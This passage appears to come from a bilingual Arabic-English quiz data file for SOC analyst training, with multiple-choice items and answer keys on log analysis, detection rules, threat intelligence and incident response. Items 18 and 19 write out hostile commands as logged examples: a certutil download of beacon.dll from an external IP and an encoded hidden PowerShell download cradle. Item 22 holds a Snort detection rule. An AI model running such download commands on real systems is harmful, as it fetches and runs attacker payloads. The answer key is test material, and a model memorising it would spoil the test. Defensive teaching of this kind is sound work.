    scenario: "رصد الـ SIEM في غضون 5 دقائق تسجيل 200 حدث برقم Event ID 4625 لحسابات مستخدمين مختلفة في الشركة، ولكن كل حساب سجل محاولة فاشلة واحدة فقط بنفس كلمة المرور ومن نفس الـ IP الداخلي.",
    scenarioEn: "Within a 5-minute window, SIEM detects 200 occurrences of Event ID 4625 across 200 distinct user accounts, each failing exactly once using the same password from a single internal IP.",
    question: "ما اسم هذا النمط الهجومي وما الغرض التكتيكي منه؟",
    questionEn: "What specific attack pattern is this and what is its tactical purpose?",
    options: [
      "هجوم رش كلمات المرور (Password Spraying)؛ لتجربة كلمة مرور واحدة شائعة (مثل Summer2026!) على مئات الحسابات لتفادي تفعيل سياسة إقفال الحساب (Account Lockout Policy).",
      "هجوم كسر كلمات المرور بالقوة الغاشمة التقليدي (Brute Force) على حساب المدير فقط.",
      "مشكلة فنية في مزامنة الوقت بين خوادم الشبكة.",
      "تحديث تلقائي لبرامج الحماية في محطات العمل."
    ],
    optionsEn: [
      "Password Spraying (T1110.003); testing a single common password across hundreds of accounts to circumvent account lockout thresholds.",
      "Traditional single-target dictionary brute forcing against the domain Administrator.",
      "Network time drift synchronization failure on the local domain controller.",
      "Automated antivirus definitions update cycle on workstations."
    ],
    correct: 0,
    explanation: "هجوم Password Spray يجرب كلمة سر واحدة على حسابات كثيرة لتفادي قفل الحسابات؛ بينما Brute Force التقليدي يجرب آلاف الكلمات على حساب واحد مما يغلقه فوراً.",
    explanationEn: "Password Spraying tests a few high-probability passwords against many usernames to stay beneath the account lockout threshold (e.g. 3 attempts per user)."
  },
  {
    id: 18,
    domain: "السجلات، Sysmon، والشبكات",
    domainEn: "Logs, Sysmon & Network Telemetry",
    topic: "Process Creation Event ID 4688 & LOLBins",
    scenario: "ظهر في سجلات ويندوز حدث برقم 4688 ينفذ الأمر التالي: `certutil.exe -urlcache -split -f \"http://185.220.101.5/beacon.dll\" C:\\Users\\Public\\beacon.dll`.",
    scenarioEn: "Windows Event ID 4688 logs command line execution: certutil.exe -urlcache -split -f 'http://185.220.101.5/beacon.dll' C:\\Users\\Public\\beacon.dll.",
    question: "كيف يفسر محلل الـ SOC هذا الحدث وما المصطلح الأمني لهذه التقنية؟",
    questionEn: "How should a SOC analyst classify this behavior and what is the technical cybersecurity term for it?",
    options: [
      "استغلال أداة نظام شرعية لتحميل بايلود خبيث؛ وتُعرف هذه التقنية بـ Living off the Land Binaries (LOLBins).",
      "تحديث طبيعي لشهادات الأمان في نظام ويندوز.",
      "طلب فحص قرص صلب روتيني من مدير النظام.",
      "تنزيل تحديث أمني تراكمي من خوادم مايكروسوفت الرسمية."
    ],
    optionsEn: [
      "Abuse of a signed native operating system binary to download malicious payloads, known as Living off the Land Binaries (LOLBins - T1105).",
      "Routine automated Windows root certificate validation.",
      "Authorized disk check utility scheduled by system administrators.",
      "Official Microsoft Windows Update distribution agent download."
    ],
    correct: 0,
    explanation: "أداة certutil مخصصة للشهادات ولكن المهاجمين يستغلونها لتحميل البرمجيات الخبيثة لتجاوز برامج الحماية، وهي أشهر تطبيقات الـ LOLBins.",
    explanationEn: "Certutil is a legitimate Windows PKI administrative tool weaponized by threat actors to fetch remote payloads, bypassing basic download restrictions (LOLBins)."
  },
  {
    id: 19,
    domain: "السجلات، Sysmon، والشبكات",
    domainEn: "Logs, Sysmon & Network Telemetry",
    topic: "Sysmon Event ID 1 & Obfuscation",
    scenario: "سجل مستشعر Sysmon حدث إنشاء عملية برقم Event ID 1 يحتوي على: `powershell.exe -w hidden -enc aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAA...`.",
    scenarioEn: "Sysmon Event ID 1 records a process creation: powershell.exe -w hidden -enc aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAA...",
    question: "ماذا يعني الوسيط `-enc` وما أول خطوة يقوم بها المحلل الجنائي لفهم ما نفذه الأمر؟",
    questionEn: "What does the -enc flag represent and what is the analyst's immediate forensic decoding step?",
    options: [
      "الوسيط `-enc` يشير إلى تنفيذ أوامر مشفرة بترميز Base64 (Unicode) لإخفائها؛ وأول خطوة هي فك تشفير النص عبر CyberChef لمعرفة الرابط والأوامر الحقيقية المنفذة.",
      "الوسيط يعني تشفير القرص الصلب لحمايته من الفيروسات.",
      "الوسيط يعني تسريع المعالج الرسومي للجهاز.",
      "الوسيط يعني إغلاق محطة العمل فوراً."
    ],
    optionsEn: [
      "-enc denotes a Base64 Unicode encoded payload designed to obfuscate intent; the analyst must immediately decode the string (via CyberChef) to reveal the C2 URL and IEX script.",
      "-enc signifies full volume BitLocker encryption to protect against ransomware.",
      "-enc commands the operating system to boost GPU rendering clock speed.",
      "-enc represents an emergency system power off sequence."
    ],
    correct: 0,
    explanation: "الوسيط `-enc` في PowerShell يستقبل أكواداً مشفرة بـ UTF-16LE Base64 للتمويه وتجاوز فلاتر النصوص؛ وفك تشفيرها يكشف الأوامر الحقيقية فوراً.",
    explanationEn: "PowerShell's -EncodedCommand parameter accepts Unicode Base64 strings. Decoding the payload reveals the hidden IEX DownloadString cradle used to load fileless malware directly into memory."
  },
  {
    id: 20,
    domain: "السجلات، Sysmon، والشبكات",
    domainEn: "Logs, Sysmon & Network Telemetry",
    topic: "Sysmon Event ID 3 & Office Anomalies",
    scenario: "رصد مستشعر Sysmon حدث اتصال شبكي برقم Event ID 3 يوضح قيام العملية `EXCEL.EXE` بإنشاء اتصال خارجي مباشر عبر المنفذ 443 بعنوان IP مشبوه في دولة أجنبية.",
    scenarioEn: "Sysmon Event ID 3 (Network Connection) captures EXCEL.EXE initiating an outbound TCP session over port 443 to an untrusted high-risk foreign IP address.",
    question: "لماذا يُعد هذا التنبيه عالي الخطورة (High Severity) في الـ SOC وما السبب الأرجح لحدوثه؟",
    questionEn: "Why is this a High Severity SOC alert and what is the most probable root cause?",
    options: [
      "لأن برامج أوفيس الطبيعية لا تنشئ اتصالات شبكية مباشرة لعناوين IP خارجية؛ والسبب الأرجح هو فتح ملف إكسل ملغوم بماكرو خبيث (VBA Macro) قام بتحميل بايلود C2.",
      "لأن برنامج إكسل يقوم بتحديث صيغ الحساب الرياضية من السيرفر.",
      "لأن المستخدم يحفظ جدول البيانات في سلة المهملات.",
      "لأن كرت الشبكة بحاجة لإعادة تعريف."
    ],
    optionsEn: [
      "Office executables have no legitimate business initiating outbound IP socket connections; this signals a weaponized macro (VBA/XLM) downloading a second-stage C2 beacon.",
      "Excel is routinely synchronizing calculation formulas with an external calculation server.",
      "The employee saved the workbook to the local network trash bin.",
      "The network interface driver requires an immediate patch update."
    ],
    correct: 0,
    explanation: "اتصال برامج أوفيس (Excel, Word) بالإنترنت شذوذ أمني صارخ يدل على تشغيل ماكرو خبيث أو استغلال ثغرة (مثل Follina) لتحميل برمجيات التحكم C2.",
    explanationEn: "Office applications spawning raw outbound network sockets strongly indicates malicious macro execution or exploit weaponization fetching external shellcode."
  },
  {
    id: 21,
    domain: "السجلات، Sysmon، والشبكات",
    domainEn: "Logs, Sysmon & Network Telemetry",
    topic: "Sysmon Event ID 11 & Ransomware",
    scenario: "خلال 60 ثانية، سجل مستشعر Sysmon توليد أكثر من 2000 حدث برقم Event ID 11 (FileCreate) على خادم الملفات، حيث تم استبدال امتدادات الملفات بـ `.locked` وتم إنشاء ملف `HOW_TO_RESTORE_FILES.txt` في كل مجلد.",
    scenarioEn: "Within 60 seconds, Sysmon Event ID 11 (FileCreate) logs over 2,000 rapid file modifications on a file server, appending .locked to filenames and dropping HOW_TO_RESTORE_FILES.txt in every folder.",
    question: "ما نوع هذا الهجوم وما هو الإجراء الفوري الحاسم لمحلل الـ SOC؟",
    questionEn: "What is this attack and what is the SOC analyst's immediate containment action?",
    options: [
      "هجوم فدية نشط (Active Ransomware Outbreak)؛ والإجراء الفوري هو عزل الجهاز فوراً عن الشبكة عبر الـ EDR (Host Isolation) لمنع تمدد التشفير لبقية أجهزة وسيرفرات الشركة.",
      "نسخ احتياطي طبيعي للملفات من قبل مدير النظام.",
      "إيقاف تشغيل الشاشة والانتظار لساعات العمل الرسمية.",
      "إرسال بريد إلكتروني للمهاجم للتفاوض قبل العزل."
    ],
    optionsEn: [
      "Active Ransomware Outbreak (T1486); the immediate required action is Host Network Isolation via EDR to prevent lateral spread to other domain assets while preserving RAM for forensics.",
      "Standard routine system backup operation initiated by storage administrators.",
      "Powering off the display monitor and waiting for the morning rotation.",
      "Emailing the threat actor's contact handle to negotiate ransom before isolating."
    ],
    correct: 0,
    explanation: "إنشاء آلاف الملفات المشفرة مع رسالة الفدية هو هجوم Ransomware حقيقي؛ والعزل الشبكي الفوري (Isolation) هو الخطوة المنقذة لحماية باقي المؤسسة.",
    explanationEn: "Mass rapid file modifications appending identical extensions alongside ransom demand text files signifies active ransomware encryption. Network containment stops encryption of network shares."
  },
  {
    id: 22,
    domain: "السجلات، Sysmon، والشبكات",
    domainEn: "Logs, Sysmon & Network Telemetry",
    topic: "Snort / Suricata IDS Signatures",
    scenario: "كتب محلل الـ SOC القاعدة التالية في نظام كشف التطفل Snort: `alert tcp any any -> 192.168.1.100 80 (msg:\"SQL Injection Attempt Detected\"; content:\"UNION SELECT\"; nocase; sid:1000001; rev:1;)`.",
    scenarioEn: "A SOC detection engineer authors the following Snort rule: alert tcp any any -> 192.168.1.100 80 (msg:\"SQL Injection Attempt Detected\"; content:\"UNION SELECT\"; nocase; sid:1000001; rev:1;).",
    question: "ما معنى الكلمة المفتاحية `nocase` في قاعدة Snort؟",
    questionEn: "What does the 'nocase' modifier signify in Snort rule syntax?",
    options: [
      "تعني مطابقة النص المذكور بصرف النظر عن حالة الأحرف سواء كانت كبيرة أو صغيرة (Case-Insensitive) لتجنب تجاوز الفحص عبر نصوص مثل `uNiOn sElEcT`.",
      "تعني إيقاف تشغيل القاعدة في نهاية الأسبوع.",
      "تعني حظر الاتصال بدلاً من إرسال تنبيه.",
      "تعني أن القاعدة تطبق على أجهزة الحواسيب المحمولة فقط."
    ],
    optionsEn: [
      "Modifies string inspection to be case-insensitive, ensuring detection whether the payload is formatted as union select, UNION SELECT, or mixed-case uNiOn sElEcT.",
      "Disables rule evaluation over weekend maintenance windows.",
      "Drops the offending packet instead of triggering a passive alert.",
      "Applies the signature strictly to mobile workstation assets."
    ],
    correct: 0,
    explanation: "المحدد `nocase` يجعل محرك البحث في الحزم يتجاهل الفروق بين الأحرف الكبيرة والصغيرة، مما يمنع المهاجمين من تجاوز القاعدة بتغيير شكل الحروف.",
    explanationEn: "The nocase modifier instructs the Snort pattern matcher to ignore ASCII letter casing, neutralizing evasion techniques that alternate upper and lower case characters."
  },
  {
    id: 23,
    domain: "السجلات، Sysmon، والشبكات",
    domainEn: "Logs, Sysmon & Network Telemetry",
    topic: "Wireshark Stream Analysis",
    scenario: "فتح المحلل ملف PCAP لمحادثة مشبوهة وقام بالنقر بالزر الأيمن على إحدى الحزم واختيار `Follow -> TCP Stream`.",
    scenarioEn: "Inspecting an anomalous session in Wireshark, the analyst right-clicks a packet and selects 'Follow -> TCP Stream'.",
    question: "ما الفائدة التحليلية لهذه الخاصية في التحقيق الجنائي الشبكي؟",
    questionEn: "What is the primary forensic benefit of the 'Follow TCP Stream' feature in Wireshark?",
    options: [
      "إعادة تجميع كل الحزم المتبادلة بين المصدر والهدف في اتصال TCP كامل وقراءتها كنص متسلسل ومترابط تماماً كما يراها التطبيق في الطبقة السابعة.",
      "حذف الحزم المشبوهة من ملف الـ PCAP لمنع العدوى.",
      "تغيير عنوان الـ IP الخاص بجهاز المحلل.",
      "فصل كابل الشبكة تلقائياً."
    ],
    optionsEn: [
      "Reassembles disjointed packets into a coherent bidirectional application layer data stream, displaying complete client/server dialogues exactly as seen at Layer 7.",
      "Scrubs malicious packets from the raw PCAP file to prevent infection.",
      "Changes the investigator's network interface IP address.",
      "Triggers an automated hardware NIC link disconnection."
    ],
    correct: 0,
    explanation: "خاصية Follow TCP Stream تعيد بناء الترافيك وتجاوز تجزئة الحزم لتعرض المحادثة الكاملة (مثل طلبات HTTP ورسائل الـ Shell) بشكل مقروء ومتكامل.",
    explanationEn: "Follow TCP Stream reassembles fragmented Layer 4 TCP segments, decoding the entire Layer 7 dialogue (such as HTTP sessions or reverse shells) into chronological text."
  },

  // --- DOMAIN 4: FRAMEWORKS, SIEM & THREAT INTEL (Q24 to Q30) ---
  {
    id: 24,
    domain: "أطر العمل والـ SIEM والاستخبارات",
    domainEn: "Frameworks, SIEM & Threat Intel",
    topic: "MITRE ATT&CK Matrix Hierarchy",
    scenario: "أثناء توثيق تقرير حادث أمني، ذكر المحلل أن المهاجم استخدم أسلوب `Phishing: Spearphishing Attachment (T1566.001)` للوصول الأولي للشبكة.",
    scenarioEn: "Documenting an incident report, a SOC analyst notes the adversary utilized Spearphishing Attachment (T1566.001) under Initial Access (TA0001).",
    question: "في هيكلية MITRE ATT&CK، ما الفرق بين التكتيك (Tactic) والتقنية (Technique)؟",
    questionEn: "Within the MITRE ATT&CK framework hierarchy, what is the fundamental difference between a Tactic and a Technique?",
    options: [
      "التكتيك (Tactic) يمثل 'الهدف الأمني أو لماذا' يقوم المهاجم بالفعل (مثل الوصول الأولي Initial Access)، بينما التقنية (Technique) تمثل 'الكيفية أو الوسيلة المحددة' لتحقيق ذلك الهدف (مثل إرسال بريد تصيد ملغوم).",
      "التكتيك هو نوع الويندوز والتقنية هي نوع بطاقة الذاكرة.",
      "التكتيك والتقنية مترادفان متطابقان تماماً ولا يوجد أي فرق بينهما.",
      "التقنية تخص المدافعين فقط والتكتيك يخص المهاجمين فقط."
    ],
    optionsEn: [
      "A Tactic represents the adversary's tactical goal or 'why' (e.g., Initial Access), while a Technique represents the specific mechanism or 'how' they achieve it (e.g., Spearphishing Attachment).",
      "Tactics describe Windows OS versions and Techniques describe RAM hardware.",
      "Tactics and Techniques are interchangeable synonyms without structural distinction.",
      "Techniques apply only to defenders and Tactics apply only to external threat actors."
    ],
    correct: 0,
    explanation: "مصفوفة MITRE تقسم الهجوم إلى تكتيكات تمثل أهداف المهاجم (Tactics = Why)، وتقنيات تمثل الطرق التنفيذية الدقيقة لتنفيذ الهدف (Techniques = How).",
    explanationEn: "In MITRE ATT&CK, Tactics describe tactical objectives (the 'why' - such as Privilege Escalation or Exfiltration), whereas Techniques describe the actionable procedures (the 'how')."
  },
  {
    id: 25,
    domain: "أطر العمل والـ SIEM والاستخبارات",
    domainEn: "Frameworks, SIEM & Threat Intel",
    topic: "Cyber Kill Chain & C2 Beaconing",
    scenario: "رصد محلل الـ SOC تدفقاً دورياً ثابتاً لحزم الاتصال يخرج من جهاز موظف كل 300 ثانية بالضبط متجهاً لسيرفر خارجي في دولة أجنبية.",
    scenarioEn: "SOC telemetry identifies uniform periodic network transmissions originating from an internal host to an untrusted external VPS every exactly 300 seconds.",
    question: "في أي مرحلة من مراحل Lockheed Martin Cyber Kill Chain يقع هذا النشاط وما المصطلح الأمني له؟",
    questionEn: "Which stage of the Lockheed Martin Cyber Kill Chain does this represent, and what is its operational term?",
    options: [
      "مرحلة القيادة والسيطرة (Command & Control - C2)، ويسمى هذا النمط بإشارات المنارة الدورية (Beaconing).",
      "مرحلة الاستطلاع (Reconnaissance).",
      "مرحلة التسليح (Weaponization).",
      "مرحلة استغلال الثغرات (Exploitation)."
    ],
    optionsEn: [
      "Command and Control (C2) stage, representing periodic agent Beaconing / heartbeat transmissions to receive instructions from the threat actor infrastructure.",
      "Reconnaissance stage.",
      "Weaponization stage.",
      "Exploitation stage."
    ],
    correct: 0,
    explanation: "الاتصال الدوري المنتظم (Heartbeat/Beaconing) بسيرفر المهاجم يدل على وجود Implant ينفذ أوامر مرحلة القيادة والسيطرة (C2) في سلسلة القتل السيبراني.",
    explanationEn: "Persistent periodic outbound connections with low jitter denote C2 beaconing heartbeats, establishing persistent remote control over infected enterprise endpoints."
  },
  {
    id: 26,
    domain: "أطر العمل والـ SIEM والاستخبارات",
    domainEn: "Frameworks, SIEM & Threat Intel",
    topic: "Threat Intelligence & Hash Lookup",
    scenario: "استخرج المحلل هاش SHA256 لملف تنفيذي مشبوه عُثر عليه في جهاز مستخدم: `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855`.",
    scenarioEn: "An incident responder extracts the SHA256 hash of a suspicious executable: e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855.",
    question: "ما هي منصة الـ OSINT المفتوحة الأهم عالمياً لفحص سمعة هذا الهاش ومعرفة تقييم 70+ محرك مكافحة فيروسات له؟",
    questionEn: "What primary global OSINT threat intelligence platform should the analyst query to inspect detection verdicts across 70+ antivirus engines?",
    options: [
      "منصة VirusTotal (أو AlienVault OTX / AbuseIPDB).",
      "محرك البحث جوجل للأخبار العامة فقط.",
      "موقع يوتيوب التعليمي.",
      "سجل تجاري محلي للشركات."
    ],
    optionsEn: [
      "VirusTotal (alongside AlienVault OTX, AbuseIPDB, or Hybrid Analysis).",
      "Google General News Search.",
      "YouTube Technical Documentation.",
      "Local corporate registry business directory."
    ],
    correct: 0,
    explanation: "منصة VirusTotal تفحص بصمات الملفات (Hashes) وعناوين الـ IP مقابل أكثر من 70 محرك حماية عالمي وتوفر تقريراً جنائياً واستخباراتياً شاملاً.",
    explanationEn: "VirusTotal aggregates detection signatures, behavioural sandboxes, and threat intel across 70+ antivirus vendors for hashes, domains, and IP addresses."
  },
  {
    id: 27,
    domain: "أطر العمل والـ SIEM والاستخبارات",
    domainEn: "Frameworks, SIEM & Threat Intel",
    topic: "EDR Capabilities & Volatile Memory Preservation",
    scenario: "اشتبه محلل الـ SOC في إصابة جهاز مدير مالي ببرمجية خبيثة متقدمة في الذاكرة العشوائية (Fileless Malware). طلب أحد الموظفين إطفاء الجهاز فوراً من مقبس الكهرباء.",
    scenarioEn: "A financial controller workstation is suspected of harboring in-memory fileless malware. An IT technician recommends pulling the power plug immediately.",
    question: "لماذا يُعد فصل الكهرباء خطأً فادحاً وما الإجراء الصحيح عبر نظام الـ EDR؟",
    questionEn: "Why is pulling the power plug a catastrophic forensic error and what is the proper EDR action?",
    options: [
      "فصل الكهرباء يمسح الذاكرة العشوائية (RAM) نهائياً ويدمر الأدلة الجنائية الحية والبايلود الخبيث المحقون؛ الإجراء الصحيح هو العزل الشبكي للجهاز (Host Isolation) عبر الـ EDR مع إبقائه قيد التشغيل لسحب صورة الذاكرة الجنائية (RAM Dump).",
      "فصل الكهرباء إجراء صحيح ومثالي ويجب تطبيقه دائماً.",
      "فصل الكهرباء يحرق القرص الصلب للجهاز.",
      "لا يوجد فرق بين إطفاء الجهاز وعزله شبكياً."
    ],
    optionsEn: [
      "Power loss instantly vaporizes volatile RAM, destroying injected shellcode and forensic evidence; proper action is EDR Host Network Isolation, keeping power on to acquire a live memory dump.",
      "Pulling the power cable is the ideal industry standard response under all circumstances.",
      "Power loss physically incinerates magnetic storage media.",
      "There is no operational difference between host isolation and powering off."
    ],
    correct: 0,
    explanation: "الذاكرة العشوائية (RAM) ذاكرة متطايرة (Volatile)؛ إطفاء الجهاز يمسح أدلة الهجوم المحقونة كلياً. العزل الشبكي عبر EDR يمنع انتشار الهجوم ويحفظ الأدلة.",
    explanationEn: "Volatile memory holds process structures, decrypted keys, and injected code. Powering off erases all volatile state. EDR network containment isolates the host while preserving RAM."
  },
  {
    id: 28,
    domain: "أطر العمل والـ SIEM والاستخبارات",
    domainEn: "Frameworks, SIEM & Threat Intel",
    topic: "Splunk SPL Query Construction",
    scenario: "طلب مدير الـ SOC كتابة استعلام بلغة Splunk SPL لاكتشاف أي حساب مستخدم يواجه أكثر من 10 محاولات تسجيل دخول فاشلة في نظام ويندوز.",
    scenarioEn: "The SOC lead requests a Splunk SPL query to surface any user account accumulating more than 10 failed Windows logons.",
    question: "أي استعلام من الاستعلامات التالية هو الصحيح والدقيق؟",
    questionEn: "Which of the following SPL queries is accurate and performant?",
    options: [
      "`index=windows EventCode=4625 | stats count by TargetUserName | where count > 10 | sort -count`",
      "`index=* delete all files`",
      "`search event=everything`",
      "`index=windows EventCode=4624 | head 10`"
    ],
    optionsEn: [
      "`index=windows EventCode=4625 | stats count by TargetUserName | where count > 10 | sort -count`",
      "`index=* delete all files`",
      "`search event=everything`",
      "`index=windows EventCode=4624 | head 10`"
    ],
    correct: 0,
    explanation: "الاستعلام يبحث في سجلات ويندوز عن حدث الفشل 4625، ويحسب عدد مرات التكرار لكل مستخدم عبر stats count، ثم يفلتر الحسابات التي تجاوزت 10 محاولات عبر where.",
    explanationEn: "This SPL targets EventCode 4625 (failed logons), aggregates frequency per username via stats count, filters for accounts exceeding 10 failures via where, and sorts descending."
  },
  {
    id: 29,
    domain: "أطر العمل والـ SIEM والاستخبارات",
    domainEn: "Frameworks, SIEM & Threat Intel",
    topic: "Wazuh SIEM Active Response",
    scenario: "تم تفعيل خاصية `Active Response` في نظام Wazuh SIEM لمراقبة محاولات اختراق خوادم الـ Linux عبر الـ SSH.",
    scenarioEn: "Active Response is configured in Wazuh SIEM to protect public-facing enterprise Linux SSH bastions.",
    question: "ماذا تفعل هذه الخاصية تلقائياً فور رصد قاعدة كشف محاولات تخمين كلمات المرور (Brute Force)؟",
    questionEn: "What action does Active Response automatically execute when brute-force threshold alerts trigger?",
    options: [
      "تقوم بتنفيذ سكريبت آلي على السيرفر (مثل firewall-drop) لحظر عنوان IP الخاص بالمهاجم تلقائياً على الجدار الناري المحلي لفترة زمنية محددة.",
      "تقوم بإعادة تثبيت نظام التشغيل من الصفر.",
      "تقوم بحذف جميع ملفات المستخدمين في السيرفر.",
      "تقوم بإرسال رسالة شكر للمهاجم."
    ],
    optionsEn: [
      "Executes an automated remediation script on the host (such as firewall-drop) to drop/block the attacker's source IP address in iptables/nftables for a set duration.",
      "Re-installs the Linux distribution from bootable media.",
      "Purges all user home directories on the server.",
      "Sends an automated appreciation email to the attacker source."
    ],
    correct: 0,
    explanation: "خاصية Active Response في Wazuh تحول النظام من المراقبة الصامتة إلى الاستجابة التلقائية؛ فتحظر الـ IP المهاجم فوراً في iptables لحماية الخادم.",
    explanationEn: "Wazuh Active Response enables automated incident containment. Upon matching alert criteria, the agent triggers OS-level scripts (e.g. firewall-drop) to blacklist rogue IPs."
  },
  {
    id: 30,
    domain: "أطر العمل والـ SIEM والاستخبارات",
    domainEn: "Frameworks, SIEM & Threat Intel",
    topic: "YARA & Sigma Rules Engineering",
    scenario: "قام مهندس رصد التهديدات (Detection Engineer) بكتابة قاعدة YARA للبحث في الملفات، وقاعدة Sigma للبحث في السجلات المركزية.",
    scenarioEn: "A threat detection engineer crafts a YARA rule for endpoint artifact hunting, alongside a Sigma rule for centralized SIEM event correlation.",
    question: "ما الفرق الجوهري في الاستخدام والتطبيق بين قواعد YARA وقواعد Sigma؟",
    questionEn: "What is the core architectural difference between YARA rules and Sigma rules?",
    options: [
      "قواعد YARA متخصصة في فحص الملفات الثنائية والذاكرة العشوائية (Files & Memory Artifacts) للبحث عن نصوص وهياكل البايتات المشبوهة، بينما قواعد Sigma متخصصة في السجلات الأمنية (Log Events) وتترجم إلى استعلامات لمختلف أنظمة الـ SIEM.",
      "قواعد YARA مخصصة للجدران النارية وقواعد Sigma مخصصة لكابلات الشبكة.",
      "قواعد Sigma مخصصة لتصميم مواقع الإنترنت وقواعد YARA لقواعد البيانات.",
      "لا يوجد أي فرق وهما اسمان لنفس الأداة."
    ],
    optionsEn: [
      "YARA inspects raw files, binaries, and memory dumps for binary strings and byte sequences; Sigma provides a generic YAML syntax for security event logs that compiles into Splunk, QRadar, or Elastic SIEM queries.",
      "YARA configures hardware firewalls and Sigma monitors optical network cabling.",
      "Sigma styles website layouts and YARA manages SQL relational schemas.",
      "There is no difference; they are duplicate brand names for the same library."
    ],
    correct: 0,
    explanation: "YARA هي لغة فرز الملفات والذاكرة بناء على التواقيع النصية والبايتات؛ بينما Sigma هي لغة المعايير العامة للسجلات التي تترجم لأي لغة استعلام SIEM.",
    explanationEn: "YARA is the defacto standard for classifying files, binaries, and process memory based on strings and byte patterns. Sigma is the generic signature format for log telemetry."
  },

  // --- DOMAIN 5: ALERT TRIAGE & INCIDENT PLAYBOOKS (Q31 to Q35) ---
  {
    id: 31,
    domain: "فرز التنبيهات والاستجابة للحوادث",
    domainEn: "Alert Triage & Incident Playbooks",
    topic: "Alert Triage: True Positive vs False Positive",
    scenario: "أطلق نظام الـ IDS تنبيهاً أمنياً حرجاً: `Internal Port Scan Detected` صادر من عنوان IP داخلي `10.0.0.15`. بالرجوع لقاعدة بيانات الأصول (Asset Inventory) تبين أن هذا العنوان مخصص لخادم أداة Nessus التابع لفريق تدقيق الثغرات في الشركة، وكان هناك موعد فحص مجدول وموافق عليه في نفس الساعة.",
    scenarioEn: "IDS generates a Critical Alert: 'Internal Port Scan Detected' originating from internal host 10.0.0.15. Checking CMDB asset inventory reveals 10.0.0.15 is the enterprise Nessus scanner executing an authorized vulnerability audit window.",
    question: "كيف يصنف محلل الـ SOC هذا التنبيه، وما الإجراء المتبع في نظام التذاكر؟",
    questionEn: "How should the SOC analyst triage this alert, and what ticketing procedure follows?",
    options: [
      "إنذار خاطئ مشروع (False Positive / Authorized Activity)؛ يتم إغلاق التذكرة وتوثيق رقم الموافقة على الفحص، وضبط قاعدة التنبيه لاستثناء سيرفر Nessus مستقبلاً لتفادي الإزعاج (Alert Fatigue).",
      "هجوم حقيقي كارثي (True Positive)؛ ويجب فصل الكهرباء عن البنك بالكامل.",
      "تجاهل التذكرة وحذفها دون كتابة أي توثيق.",
      "عزل جهاز المدير العام للشركة."
    ],
    optionsEn: [
      "False Positive / Authorized Benign Activity; close ticket with approved RFC change ticket reference, and fine-tune detection rule to whitelist the scanner IP to prevent alert fatigue.",
      "Catastrophic True Positive; disconnect the entire corporate data center power.",
      "Ignore ticket and silently delete logs without documenting audit notes.",
      "Isolate the Chief Executive Officer's workstation."
    ],
    correct: 0,
    explanation: "النشاط صادر من أداة مسح معتمدة في موعد فحص متفق عليه؛ يصنف التنبيه كـ False Positive وتوثق الملاحظات وتستثنى الأداة لتفادي إرهاق التنبيهات.",
    explanationEn: "Because the activity aligns with an authorized scanning window from verified scanning infrastructure, it is classified as a benign positive (FP), documented with change ticket IDs, and whitelisted."
  },
  {
    id: 32,
    domain: "فرز التنبيهات والاستجابة للحوادث",
    domainEn: "Alert Triage & Incident Playbooks",
    topic: "Phishing Incident Response Playbook",
    scenario: "أبلغ موظف في قسم المالية عن استلامه بريداً إلكترونياً مشبوهاً يحتوي على رابط لموقع تسجيل دخول مزيف يحاكي بوابة Office 365. قام الموظف بالفعل بالضغط على الرابط وإدخال بريده وكلمة مروره قبل أن يدرك الخطأ.",
    scenarioEn: "A finance employee reports receiving a suspicious email mimicking the Office 365 portal. The employee clicked the embedded URL and entered their username and password before realizing the deception.",
    question: "وفق كراسة تشغيل التصيد الاحتيالي (Phishing Playbook)، ما هي الخطوات الثلاث الفورية الواجب اتخاذها في الدقائق العشر الأولى؟",
    questionEn: "According to standard Phishing Incident Playbooks, what are the first three containment actions within 10 minutes?",
    options: [
      "1. إعادة تعيين كلمة مرور حساب الموظف فوراً وإنهاء جميع جلساته النشطة (Revoke Active Sessions)؛ 2. حظر الرابط والدومين الخبيث في الجدار الناري ومزود البريد؛ 3. البحث في خادم البريد وسحب الرسالة من صناديق جميع الموظفين الآخرين لمنع وقوع ضحايا آخرين.",
      "1. معاقبة الموظف وخصم راتبه؛ 2. إيقاف خادم البريد بالكامل؛ 3. الانتظار حتى الغد.",
      "1. الضغط على الرابط من جهاز المحلل للتأكد؛ 2. إرسال كلمة المرور للمهاجم للتأكد.",
      "1. إعادة توجيه الإيميل لجميع موظفي الشركة لتحذيرهم."
    ],
    optionsEn: [
      "1. Immediately reset employee credentials and revoke all active OAuth/refresh sessions; 2. Block phishing domain/URL on perimeter firewalls and secure email gateways; 3. Purge/clawback the phishing email from all recipient inboxes.",
      "1. Disciplinary action against the employee; 2. Shut down email servers globally; 3. Wait for the next business day.",
      "1. Click the malicious link from analyst workstation without sandbox; 2. Confirm credentials by texting the attacker.",
      "1. Forward the raw phishing email to all company distribution lists."
    ],
    correct: 0,
    explanation: "تغيير كلمة السر وإلغاء الجلسات النشطة يمنع المهاجم من الدخول، وحظر الرابط وسحب الإيميل من باقي صناديق البريد يحمي باقي موظفي المنشأة من الوقوع في الفخ.",
    explanationEn: "Immediate password reset and session revocation cuts off compromised access, firewall blocking prevents beaconing, and global mail clawback eliminates widespread exposure across the domain."
  },
  {
    id: 33,
    domain: "فرز التنبيهات والاستجابة للحوادث",
    domainEn: "Alert Triage & Incident Playbooks",
    topic: "Ransomware Incident Response Playbook",
    scenario: "تأكد محلل الـ SOC من بدء انتشار فيروس فدية مشفر عبر بروتوكول مشاركة الملفات SMB من جهاز مصاب في قسم المحاسبة باتجاه خوادم النسخ الاحتياطي.",
    scenarioEn: "SOC verifies an active ransomware outbreak propagating across internal SMB shares from an infected workstation towards internal backup volumes.",
    question: "ما هو الإجراء الحاسم رقم 1 في مرحلة الاحتواء (Containment) لوقف انتشار الكارثة؟",
    questionEn: "What is the critical step #1 during the Containment phase to halt the disaster?",
    options: [
      "تطبيق العزل الشبكي الفوري (Network Containment / Host Isolation) عبر منصة الـ EDR للجهاز المصاب وقطع المنافذ 445 و 139 مؤقتاً في شبكة القسم لمنع التمدد الجانبي.",
      "إجراء مسح أسبوعي شامل للجهاز.",
